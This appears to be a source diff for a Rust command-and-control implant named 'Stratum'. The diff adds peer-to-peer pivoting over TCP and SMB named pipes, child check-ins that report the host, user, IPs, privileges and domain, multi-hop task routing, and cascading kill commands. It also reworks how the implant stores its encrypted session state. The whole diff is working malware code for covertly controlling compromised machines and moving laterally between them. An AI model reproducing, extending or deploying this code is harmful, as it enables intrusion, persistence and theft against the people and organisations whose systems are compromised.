@@ -14,6 +14,7 @@ pub mod exec;
 pub mod hw;
 pub mod inlinexec;
 pub mod obfs;
+pub mod p2p;
 pub mod persist;
 pub mod protocol;
 pub mod sysinfo;
@@ -75,6 +76,17 @@ const SESSION_KEY_XOR: &str = env!("STRATUM_SESSION_KEY_XOR");
 const SESSION_KEY_MASK: &str = env!("STRATUM_XOR_MASK");
 #[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
 const PREKEY_POOL_B64: &str = env!("STRATUM_PREKEY_POOL_B64");
+
+// ── P2P compile-time constants (only for stratum_p2p builds) ─────────────────
+
+#[cfg(stratum_p2p)]
+const P2P_BIND_ADDR:  &str = env!("STRATUM_P2P_BIND_ADDR");
+#[cfg(stratum_p2p)]
+const P2P_BIND_TYPE:  &str = env!("STRATUM_P2P_BIND_TYPE");
+#[cfg(stratum_p2p)]
+const P2P_GUID_HEX:   &str = env!("STRATUM_P2P_GUID");
+#[cfg(stratum_p2p)]
+const P2P_STUN_IP:    &str = env!("STRATUM_STUN_IP");
 
 // ── DLL entry + LOLBin exports (Windows only) ────────────────────────────────
 
@@ -534,6 +546,77 @@ pub fn agent_loop() {
     #[cfg(stratum_stageless_enc)]
     { stageless_enc::run(); _exit_if_dll(); return; }
 
+    // ── P2P child mode: no cloud transport, listen for parent link ────────
+    #[cfg(stratum_p2p)]
+    {
+        dlog!("AL", "mode: p2p-child");
+        let guid = parse_p2p_guid(P2P_GUID_HEX);
+        let registry = std::sync::Arc::new(p2p::LinkRegistry::new(guid));
+
+        let bind_type = P2P_BIND_TYPE;
+        let bind_addr = P2P_BIND_ADDR;
+
+        // Start listener and accept parent connection
+        let link_type = if bind_type == "smb" {
+            p2p::LinkType::Smb
+        } else {
+            p2p::LinkType::Tcp
+        };
+
+        dlog!("AL", "p2p bind: {} {}", bind_type, bind_addr);
+
+        let parent_link = match link_type {
+            p2p::LinkType::Tcp => {
+                let listener = match p2p::tcp::TcpP2PListener::bind(bind_addr) {
+                    Ok(l) => l,
+                    Err(_) => { dlog!("AL", "tcp bind failed"); _exit_if_dll(); return; }
+                };
+                dlog!("AL", "tcp listener ready, waiting for parent");
+                loop {
+                    let stream_transport = match listener.accept() {
+                        Ok(t) => t,
+                        Err(_) => { dlog!("AL", "tcp accept failed"); _exit_if_dll(); return; }
+                    };
+                    let arc_transport: std::sync::Arc<dyn p2p::P2PTransport> = std::sync::Arc::new(stream_transport);
+                    match p2p::link::link_as_child(arc_transport, guid, link_type) {
+                        Ok(link) => break link,
+                        Err(_) => { dlog!("AL", "link handshake failed, retrying accept"); continue; }
+                    }
+                }
+            }
+            #[cfg(windows)]
+            p2p::LinkType::Smb => {
+                let listener = p2p::smb::SmbP2PListener::new(bind_addr);
+                dlog!("AL", "smb pipe ready, waiting for parent");
+                loop {
+                    let pipe_transport = match listener.accept() {
+                        Ok(t) => t,
+                        Err(_) => { dlog!("AL", "smb accept failed"); _exit_if_dll(); return; }
+                    };
+                    let arc_transport: std::sync::Arc<dyn p2p::P2PTransport> = std::sync::Arc::new(pipe_transport);
+                    match p2p::link::link_as_child(arc_transport, guid, link_type) {
+                        Ok(link) => break link,
+                        Err(_) => { dlog!("AL", "link handshake failed, retrying accept"); continue; }
+                    }
+                }
+            }
+            #[cfg(not(windows))]
+            p2p::LinkType::Smb => {
+                dlog!("AL", "smb not available on this platform, falling back to tcp");
+                _exit_if_dll(); return;
+            }
+        };
+
+        dlog!("AL", "parent linked: {}", parent_link.address);
+        registry.set_parent(parent_link);
+
+        p2p::router::start_heartbeat_sender(registry.clone());
+
+        p2p_child_loop(&registry);
+        _exit_if_dll();
+        return;
+    }
+
     #[cfg(not(any(stratum_staged_enc, stratum_stageless_enc)))]
     {
         #[cfg(all(windows, stratum_debug))]
@@ -596,6 +679,219 @@ pub fn agent_loop() {
     }
 }
 
+// ── P2P helpers ──────────────────────────────────────────────────────────────
+
+#[cfg(stratum_p2p)]
+fn parse_p2p_guid(hex_str: &str) -> [u8; 16] {
+    let bytes = hex::decode(hex_str).unwrap_or_else(|_| vec![0u8; 16]);
+    let mut guid = [0u8; 16];
+    let len = bytes.len().min(16);
+    guid[..len].copy_from_slice(&bytes[..len]);
+    guid
+}
+
+#[cfg(stratum_p2p)]
+fn p2p_child_loop(registry: &std::sync::Arc<p2p::LinkRegistry>) {
+    dlog!("P2P", "child loop started");
+    registry.touch_parent();
+
+    let state = exec::AgentState::new(30, 20, "", "", "", "");
+
+    // Auto-checkin: send session metadata so server can populate the session list
+    {
+        let info = crate::sysinfo::AgentInfo::collect(P2P_STUN_IP);
+        let checkin_json = serde_json::json!({
+            "type": "p2p_checkin",
+            "guid": P2P_GUID_HEX,
+            "hostname": info.hostname,
+            "username": info.username,
+            "ip_int": info.ip_int,
+            "ip_ext": info.ip_ext,
+            "os": info.os,
+            "privs": info.privs,
+            "domain": info.domain,
+            "pid": info.pid,
+            "process": info.process,
+        });
+        let checkin_bytes = serde_json::to_vec(&checkin_json).unwrap_or_default();
+        if let Err(e) = p2p::router::send_to_parent(registry, &checkin_bytes) {
+            dlog!("P2P", "auto-checkin send failed: {}", e);
+        } else {
+            dlog!("P2P", "auto-checkin sent ({} bytes)", checkin_bytes.len());
+        }
+    }
+
+    loop {
+        if !KILL_DATE.is_empty() && kill_date_expired(KILL_DATE) {
+            dlog!("P2P", "kill date reached");
+            break;
+        }
+
+        if !in_window(WINDOW_START, WINDOW_END) {
+            std::thread::sleep(Duration::from_secs(5));
+            continue;
+        }
+
+        let idle = registry.parent_idle_ms();
+        if idle > 120_000 && registry.has_parent() {
+            dlog!("P2P", "parent heartbeat timeout ({}ms idle)", idle);
+            registry.clear_parent();
+        }
+
+        let payload = match p2p::router::relay_parent_downstream(registry) {
+            Some(p) => {
+                registry.touch_parent();
+                p
+            }
+            None => {
+                if !registry.has_parent() {
+                    dlog!("P2P", "parent lost — entering reconnect");
+                    registry.parent_lost.store(true, std::sync::atomic::Ordering::Relaxed);
+                    if !p2p_child_reconnect(registry) {
+                        dlog!("P2P", "reconnect exhausted, exiting");
+                        break;
+                    }
+                    dlog!("P2P", "parent reconnected");
+                    registry.parent_lost.store(false, std::sync::atomic::Ordering::Relaxed);
+                    registry.touch_parent();
+                    // Re-send checkin after reconnect
+                    let info = crate::sysinfo::AgentInfo::collect(P2P_STUN_IP);
+                    let checkin_json = serde_json::json!({
+                        "type": "p2p_checkin",
+                        "guid": P2P_GUID_HEX,
+                        "hostname": info.hostname,
+                        "username": info.username,
+                        "ip_int": info.ip_int,
+                        "ip_ext": info.ip_ext,
+                        "os": info.os,
+                        "privs": info.privs,
+                        "domain": info.domain,
+                        "pid": info.pid,
+                        "process": info.process,
+                    });
+                    let checkin_bytes = serde_json::to_vec(&checkin_json).unwrap_or_default();
+                    let _ = p2p::router::send_to_parent(registry, &checkin_bytes);
+                }
+                std::thread::sleep(Duration::from_millis(100));
+                continue;
+            }
+        };
+
+        let task: protocol::Task = match serde_json::from_slice(&payload) {
+            Ok(t) => t,
+            Err(_) => {
+                dlog!("P2P", "invalid task JSON");
+                continue;
+            }
+        };
+
+        dlog!("P2P", "task: {} id={}", task.kind, task.id);
+
+        let response = exec::dispatch_p2p(&task, &state);
+
+        if let Some(resp) = response {
+            let resp_json = serde_json::to_vec(&resp).unwrap_or_default();
+            if let Err(e) = p2p::router::send_to_parent(registry, &resp_json) {
+                dlog!("P2P", "send upstream failed: {}", e);
+                if !registry.has_parent() {
+                    registry.parent_lost.store(true, std::sync::atomic::Ordering::Relaxed);
+                    if !p2p_child_reconnect(registry) { break; }
+                    registry.parent_lost.store(false, std::sync::atomic::Ordering::Relaxed);
+                    registry.touch_parent();
+                }
+            }
+        } else {
+            p2p_kill_children(registry);
+            break;
+        }
+    }
+
+    dlog!("P2P", "child loop exited");
+}
+
+#[cfg(stratum_p2p)]
+fn p2p_child_reconnect(registry: &std::sync::Arc<p2p::LinkRegistry>) -> bool {
+    let bind_type = P2P_BIND_TYPE;
+    let bind_addr = P2P_BIND_ADDR;
+    let guid = registry.my_guid;
+    let link_type = if bind_type == "smb" { p2p::LinkType::Smb } else { p2p::LinkType::Tcp };
+
+    registry.clear_parent();
+    let mut attempt = 0u32;
+
+    loop {
+        if !KILL_DATE.is_empty() && kill_date_expired(KILL_DATE) { return false; }
+        if !registry.reconnect_cfg.should_retry(attempt) {
+            dlog!("P2P", "reconnect: max retries ({}) reached", attempt);
+            return false;
+        }
+
+        let delay = registry.reconnect_cfg.delay_for_attempt(attempt);
+        dlog!("P2P", "reconnect: attempt {} — wait {:?}", attempt + 1, delay);
+        std::thread::sleep(delay);
+
+        let result = match link_type {
+            p2p::LinkType::Tcp => {
+                p2p::tcp::TcpP2PListener::bind(bind_addr).and_then(|listener| {
+                    listener.accept().and_then(|transport| {
+                        let arc_t: std::sync::Arc<dyn p2p::P2PTransport> = std::sync::Arc::new(transport);
+                        p2p::link::link_as_child(arc_t, guid, link_type)
+                    })
+                })
+            }
+            #[cfg(windows)]
+            p2p::LinkType::Smb => {
+                let listener = p2p::smb::SmbP2PListener::new(bind_addr);
+                listener.accept().and_then(|transport| {
+                    let arc_t: std::sync::Arc<dyn p2p::P2PTransport> = std::sync::Arc::new(transport);
+                    p2p::link::link_as_child(arc_t, guid, link_type)
+                })
+            }
+            #[cfg(not(windows))]
+            p2p::LinkType::Smb => {
+                return false;
+            }
+        };
+
+        match result {
+            Ok(link) => {
+                dlog!("P2P", "reconnect: parent re-linked from {}", link.address);
+                registry.set_parent(link);
+                return true;
+            }
+            Err(e) => {
+                dlog!("P2P", "reconnect: attempt {} failed: {}", attempt + 1, e);
+                attempt += 1;
+            }
+        }
+    }
+}
+
+#[cfg(stratum_p2p)]
+fn p2p_kill_children(registry: &std::sync::Arc<p2p::LinkRegistry>) {
+    let child_guids = registry.child_guids();
+    for cg in &child_guids {
+        let kill_msg = p2p::RoutedMessage {
+            msg_type: p2p::MsgType::Delivery,
+            next_guid: *cg,
+            payload: b"{\"id\":\"kill-cascade\",\"kind\":\"kill\",\"args\":\"\"}".to_vec(),
+        };
+        let serialized = kill_msg.serialize();
+        let children = registry.children.lock().unwrap();
+        if let Some(child) = children.get(cg) {
+            if let Some(enc) = p2p::router::encrypt_for_link(&child.link_key, &serialized) {
+                let _ = child.transport.send(&enc);
+            }
+        }
+    }
+    std::thread::sleep(Duration::from_millis(500));
+    for cg in &child_guids {
+        if let Some(link) = registry.remove_child(cg) {
+            link.transport.close();
+        }
+    }
+}
+
 fn restore_or_bootstrap_epoch(
     epoch_blob: &str,
     prekey_pool: &[[u8; 32]],
@@ -605,22 +901,23 @@ fn restore_or_bootstrap_epoch(
     if let Some(plain) = hw::read_blob(epoch_blob, "epoch-salt") {
         if let Some(data) = plain.strip_prefix("STRATUM:") {
             if let Ok(bytes) = hex::decode(data) {
-                if let Some(st) = epoch::epoch_state_from_bytes(&bytes) {
+                if let Some(st) = epoch::epoch_state_from_bytes_with_fp(&bytes, prekey_pool) {
                     dlog!("EP", "epoch state restored, epoch={}", st.epoch);
                     return st;
                 }
+                dlog!("EP", "stale epoch cache (prekey mismatch), re-bootstrapping");
             }
         }
     }
     let prekey = prekey_pool.first().copied().unwrap_or([0u8; 32]);
     let st = epoch::bootstrap_epoch(&prekey, session_key, agent_id);
-    persist_epoch_state(&st, epoch_blob);
+    persist_epoch_state(&st, epoch_blob, prekey_pool);
     dlog!("EP", "epoch state bootstrapped");
     st
 }
 
-fn persist_epoch_state(state: &epoch::EpochState, epoch_blob: &str) {
-    let bytes = epoch::epoch_state_to_bytes(state);
+fn persist_epoch_state(state: &epoch::EpochState, epoch_blob: &str, prekey_pool: &[[u8; 32]]) {
+    let bytes = epoch::epoch_state_to_bytes_v2(state, prekey_pool);
     let payload = format!("STRATUM:{}", hex::encode(&bytes));
     hw::write_blob(epoch_blob, payload.as_bytes(), "epoch-salt");
 }
@@ -680,12 +977,13 @@ pub(crate) fn run_loop(
         let hb_seq = state.hb_seq.fetch_add(1, std::sync::atomic::Ordering::Relaxed) + 1;
         let next_hb_at = unix_now() + sleep_secs;
         let heartbeat = build_heartbeat(info, start_cwd, &op_cwd, blob, hb_seq, next_hb_at);
+
         rl_log!("encrypting heartbeat");
         let epoch_blob_path = format!("{}.epoch", blob);
         if let Some(enc) = epoch::encrypt_message_v2(epoch_state, heartbeat.as_bytes()) {
             rl_log!("uploading heartbeat (v2)");
             transport.upload(&format!("{}{}", folder, hb_f), &enc);
-            persist_epoch_state(epoch_state, &epoch_blob_path);
+            persist_epoch_state(epoch_state, &epoch_blob_path, prekey_pool);
             rl_log!("heartbeat uploaded");
         } else {
             rl_log!("heartbeat encrypt failed");
@@ -704,17 +1002,17 @@ pub(crate) fn run_loop(
 
         rl_log!("decrypting command");
         let prekey = prekey_pool.first().copied().unwrap_or([0u8; 32]);
-        let task = match epoch::decrypt_command_v2(&raw, epoch_state, pub_key, session_key, agent_id, &prekey) {
-            Some(t) => {
-                persist_epoch_state(epoch_state, &epoch_blob_path);
-                t
+        let (task, task_raw_bytes) = match epoch::decrypt_command_v2_raw(&raw, epoch_state, pub_key, session_key, agent_id, &prekey) {
+            Some((t, raw_bytes)) => {
+                persist_epoch_state(epoch_state, &epoch_blob_path, prekey_pool);
+                (t, raw_bytes)
             }
             None => {
                 rl_log!("decrypt failed");
                 let km = format!("KM:{}", unix_now());
                 if let Some(enc) = epoch::encrypt_message_v2(epoch_state, km.as_bytes()) {
                     transport.upload(&format!("{}{}", folder, hb_f), &enc);
-                    persist_epoch_state(epoch_state, &epoch_blob_path);
+                    persist_epoch_state(epoch_state, &epoch_blob_path, prekey_pool);
                 }
                 std::thread::sleep(Duration::from_secs(sleep_secs));
                 continue;
@@ -732,6 +1030,203 @@ pub(crate) fn run_loop(
         }
 
         rl_log!("task.kind={} task.id={}", task.kind, task.id);
+
+        // ── P2P route handling: forward to child if task has p2p_route ──────
+        if let Some(ref route) = task.p2p_route {
+            rl_log!("P2P route: target={} hops={} guid_path={:?} path={:?}",
+                     route.target, route.hops, route.guid_path, route.path);
+            let lookup = if !route.guid_path.is_empty() { &route.guid_path } else { &route.path };
+
+            // Resolve the chain of GUIDs after our own position
+            let my_guid_hex = hex::encode(&exec::p2p_registry().my_guid);
+            let mut hop_guids: Vec<[u8; 16]> = Vec::new();
+            let mut found_self = false;
+            for guid_hex in lookup {
+                if !found_self {
+                    if guid_hex == &my_guid_hex || guid_hex.starts_with(&my_guid_hex) || my_guid_hex.starts_with(guid_hex.as_str()) {
+                        found_self = true;
+                    }
+                    continue;
+                }
+                // Resolve hex guid to [u8; 16]
+                if let Ok(bytes) = hex::decode(guid_hex) {
+                    if bytes.len() == 16 {
+                        let mut g = [0u8; 16];
+                        g.copy_from_slice(&bytes);
+                        hop_guids.push(g);
+                    }
+                }
+            }
+
+            // Fallback: if we couldn't find ourselves in the path, find first child match
+            if hop_guids.is_empty() {
+                let children = exec::p2p_registry().children.lock().unwrap();
+                for guid_hex in lookup {
+                    for (guid, _) in children.iter() {
+                        let child_hex = hex::encode(guid);
+                        if guid_hex == &child_hex || guid_hex.starts_with(&child_hex) || child_hex.starts_with(guid_hex.as_str()) {
+                            hop_guids.push(*guid);
+                            break;
+                        }
+                    }
+                    if !hop_guids.is_empty() { break; }
+                }
+                drop(children);
+            }
+
+            rl_log!("P2P route: resolved {} hops after self", hop_guids.len());
+
+            let next_hop_guid = hop_guids.first().copied();
+
+            if let Some(child_guid) = next_hop_guid {
+                rl_log!("P2P route: forwarding to child {}", hex::encode(&child_guid));
+
+                // Build nested RoutedMessages from target back to first hop.
+                // hop_guids = [B, C] for A→B→C, or [B] for A→B direct.
+                //
+                // For A→B (1 hop): Delivery(next_guid=B, payload=task_json)
+                //   A encrypts with link_key(A-B), sends to B.
+                //   B: process_incoming → Delivery → ForMe(task_json) ✓
+                //
+                // For A→B→C (2 hops):
+                //   Inner: Delivery(next_guid=C, payload=task_json)
+                //   Outer: Routing(next_guid=C, payload=inner.serialize())
+                //   A encrypts outer with link_key(A-B), sends to B.
+                //   B: process_incoming → Routing, next_guid=C is B's child →
+                //      re-encrypt inner payload with link_key(B-C), forward to C.
+                //   C: process_incoming → Delivery → ForMe(task_json) ✓
+                let routed_data = if hop_guids.len() == 1 {
+                    // Direct: single Delivery for the child
+                    let routed = p2p::RoutedMessage {
+                        msg_type: p2p::MsgType::Delivery,
+                        next_guid: child_guid,
+                        payload: task_raw_bytes.clone(),
+                    };
+                    routed.serialize()
+                } else {
+                    // Multi-hop: build from target inward
+                    // Start with Delivery for the final target
+                    let target_guid = *hop_guids.last().unwrap();
+                    let mut payload = p2p::RoutedMessage {
+                        msg_type: p2p::MsgType::Delivery,
+                        next_guid: target_guid,
+                        payload: task_raw_bytes.clone(),
+                    }.serialize();
+                    // Wrap each intermediate hop (from second-to-last down to index 1).
+                    // next_guid = the hop AFTER the one that will process this layer,
+                    // i.e. the child of the processing node.
+                    for i in (1..hop_guids.len()).rev() {
+                        payload = p2p::RoutedMessage {
+                            msg_type: p2p::MsgType::Routing,
+                            next_guid: hop_guids[i],
+                            payload,
+                        }.serialize();
+                    }
+                    payload
+                };
+
+                // Activate routing mode: relay thread will deposit responses in channel
+                {
+                    let children = exec::p2p_registry().children.lock().unwrap();
+                    if let Some(child) = children.get(&child_guid) {
+                        // Drain any stale data from previous routing
+                        while let Ok(_) = child.route_rx.lock().unwrap().try_recv() {}
+                        child.routing_active.store(true, std::sync::atomic::Ordering::SeqCst);
+                    }
+                }
+
+                let send_ok = {
+                    let children = exec::p2p_registry().children.lock().unwrap();
+                    if let Some(child) = children.get(&child_guid) {
+                        match p2p::router::encrypt_for_link(&child.link_key, &routed_data) {
+                            Some(enc) => {
+                                let _ = child.transport.send(&enc);
+                                rl_log!("P2P route: sent {} bytes to child", enc.len());
+                                true
+                            }
+                            None => {
+                                rl_log!("P2P route: encrypt_for_link failed");
+                                false
+                            }
+                        }
+                    } else {
+                        rl_log!("P2P route: child not in registry");
+                        false
+                    }
+                };
+
+                let resp_data = if send_ok {
+                    let deadline = std::time::Instant::now() + Duration::from_secs(120);
+                    let mut result: Option<Vec<u8>> = None;
+                    loop {
+                        let remaining = deadline.saturating_duration_since(std::time::Instant::now());
+                        if remaining.is_zero() { break; }
+                        let rx_result = {
+                            let children = exec::p2p_registry().children.lock().unwrap();
+                            if let Some(child) = children.get(&child_guid) {
+                                child.route_rx.lock().unwrap().recv_timeout(remaining.min(Duration::from_secs(5)))
+                            } else {
+                                break;
+                            }
+                        };
+                        match rx_result {
+                            Ok(plain) => {
+                                rl_log!("P2P route: got response {} bytes via channel", plain.len());
+                                result = Some(plain);
+                                break;
+                            }
+                            Err(std::sync::mpsc::RecvTimeoutError::Timeout) => continue,
+                            Err(_) => break,
+                        }
+                    }
+                    result
+                } else { None };
+
+                // Deactivate routing mode
+                {
+                    let children = exec::p2p_registry().children.lock().unwrap();
+                    if let Some(child) = children.get(&child_guid) {
+                        child.routing_active.store(false, std::sync::atomic::Ordering::SeqCst);
+                    }
+                }
+
+                if let Some(resp_bytes) = resp_data {
+                    rl_log!("P2P route: uploading response ({} bytes)", resp_bytes.len());
+                    if let Some(enc) = epoch::encrypt_message_v2(epoch_state, &resp_bytes) {
+                        let output_path_full = format!("{}{}", folder, output_f);
+                        transport.upload(&output_path_full, &enc);
+                        persist_epoch_state(epoch_state, &epoch_blob_path, prekey_pool);
+                    }
+                } else {
+                    rl_log!("P2P route: no response from child");
+                    let err_resp = crate::protocol::TaskResponse::err(&task,
+                        "ERROR: P2P child did not respond".to_string());
+                    let resp_json = serde_json::to_vec(&err_resp).unwrap_or_default();
+                    if let Some(enc) = epoch::encrypt_message_v2(epoch_state, &resp_json) {
+                        let output_path_full = format!("{}{}", folder, output_f);
+                        transport.upload(&output_path_full, &enc);
+                        persist_epoch_state(epoch_state, &epoch_blob_path, prekey_pool);
+                    }
+                }
+                transport.upload(&input_path, b"MZ");
+                std::thread::sleep(Duration::from_secs(sleep_secs));
+                continue;
+            } else {
+                rl_log!("P2P route: no linked child found for route, returning error");
+                let err_resp = crate::protocol::TaskResponse::err(&task,
+                    "ERROR: P2P route failed — child not linked".to_string());
+                let resp_json = serde_json::to_vec(&err_resp).unwrap_or_default();
+                if let Some(enc) = epoch::encrypt_message_v2(epoch_state, &resp_json) {
+                    let output_path_full = format!("{}{}", folder, output_f);
+                    transport.upload(&output_path_full, &enc);
+                    persist_epoch_state(epoch_state, &epoch_blob_path, prekey_pool);
+                }
+                transport.upload(&input_path, b"MZ");
+                std::thread::sleep(Duration::from_secs(sleep_secs));
+                continue;
+            }
+        }
+
         *state.epoch_key.lock().unwrap() = Some(epoch_state.epoch_key);
         rl_log!("dispatching task");
         let dispatch_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
@@ -752,7 +1247,7 @@ pub(crate) fn run_loop(
                 if let Some(enc) = epoch::encrypt_message_v2(epoch_state, err_json.as_bytes()) {
                     let output_path_full = format!("{}{}", folder, output_f);
                     transport.upload(&output_path_full, &enc);
-                    persist_epoch_state(epoch_state, &epoch_blob_path);
+                    persist_epoch_state(epoch_state, &epoch_blob_path, prekey_pool);
                 }
                 transport.upload(&input_path, b"MZ");
             }
@@ -770,7 +1265,7 @@ pub(crate) fn run_loop(
                             std::thread::sleep(Duration::from_secs(2 * attempt));
                             up = transport.upload(&output_path_full, &enc);
                         }
-                        persist_epoch_state(epoch_state, &epoch_blob_path);
+                        persist_epoch_state(epoch_state, &epoch_blob_path, prekey_pool);
                         rl_log!("output upload={}", up);
                     }
                     None => { rl_log!("encrypt_response returned None"); }
